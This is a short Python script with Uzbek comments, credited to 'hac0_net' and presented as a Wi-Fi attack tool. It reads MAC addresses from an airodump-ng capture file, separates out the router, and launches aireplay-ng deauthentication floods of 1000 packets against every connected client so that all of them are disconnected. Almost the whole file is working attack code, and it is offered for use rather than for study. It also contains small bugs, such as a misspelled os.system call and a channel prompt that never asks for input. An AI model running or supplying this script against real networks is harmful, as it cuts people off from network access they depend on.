#!/usr/bin/env python
import re
import subprocess
import time
import os



'''
Bu dastur yozib olgan ma'lumotlardan ( airodump-ng --bssid { wi-fi mac addresi } --channel { wi-fi kanali }  interface  -w file_name ) 
foydalanib wi-figa ulangan barcha qurilmalarni uzadi ( to'xtovsiz so'rov jo'natish o'rqali
coder: hac0_net

'''
os.sytem("clear")
interface=input("interfaseni kiriting -->")
''' 
fileni terminal orqali airodump-ng --bssid { wi-fi mac addresi } --channel { wi-fi kanali }  interface  -w file_name 
bizga csv kengaytmalik  file_name nomli file file yozib beradi. bizdan so'ralgan file_namega faqat nomini kiritamiz 
kengaytmasini emas !!!

'''
file_n=input("file nomini kiriting (kengaytmasisiz)  -->")
file_name=str(file_n+'.csv')
mac_pattern = r'(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}'
channel=("router kanalini kiriting -->")

subprocess.call("figlet -t wi-fi attacking  ",shell=True)
subprocess.call("figlet  -t  'by hac0_net' ",shell=True)

def find_mac_addresses(text):


    mac_addresses = re.findall(mac_pattern, text)
    return mac_addresses

if __name__ == "__main__":
  
    with open(f'{file_name}', 'r') as file:
        text = file.read() 
    
    mac_addresses = find_mac_addresses(text)
    
    route_mac=str(mac_addresses[0])
    print(route_mac)
   
    for i in range(int(mac_addresses.count(route_mac))):
        mac_addresses.remove(route_mac)
    for i in mac_addresses:
        print(i)
    print("\nstart attacking !!!\n")
  
    try:
        for i in mac_addresses:
        
            subprocess.run(['gnome-terminal', '--', 'bash', '-c' , f" aireplay-ng --deauth  1000 -a {route_mac} -c {i}  {interface}"])
            time.sleep(1)

    except Exception as e:
        print(f"Xatolik yuz berdi: {e}")


